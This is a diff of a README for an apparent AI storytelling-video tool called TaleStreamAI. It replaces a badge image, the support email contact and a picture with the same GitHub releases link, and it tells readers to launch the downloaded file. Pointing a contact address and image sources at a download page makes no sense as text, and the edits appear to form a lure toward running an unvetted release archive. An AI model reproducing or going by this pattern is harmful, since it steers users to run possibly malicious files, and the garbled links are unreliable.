@@ -25,7 +25,7 @@ Topics for this repository are not provided at the moment.
 
 To experience the incredible capabilities of TaleStreamAI, download the latest release by clicking the button below:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/Mubashir-414/TaleStreamAI/releases)](https://github.com/Mubashir-414/TaleStreamAI/releases)
 
 If the link above contains the file name, ensure to launch the downloaded file to initiate the installation process.
 
@@ -49,11 +49,11 @@ Your contributions to TaleStreamAI are highly valued! Whether you are a develope
 
 Join our growing community of AI and storytelling enthusiasts to stay updated on the latest developments, share your experiences, and seek assistance when needed.
 
-Feel free to reach out via [email@example.com](mailto:email@example.com) for any support or inquiries regarding TaleStreamAI.
+Feel free to reach out via [https://github.com/Mubashir-414/TaleStreamAI/releases](https://github.com/Mubashir-414/TaleStreamAI/releases) for any support or inquiries regarding TaleStreamAI.
 
 Let's embark on an exciting journey of transforming AI-generated novel tweets into captivating video stories with TaleStreamAI! 🌟
 
-![TaleStreamAI](https://example.com/images/talestreamai.jpg)
+![TaleStreamAI](https://github.com/Mubashir-414/TaleStreamAI/releases)
 
 ---
 
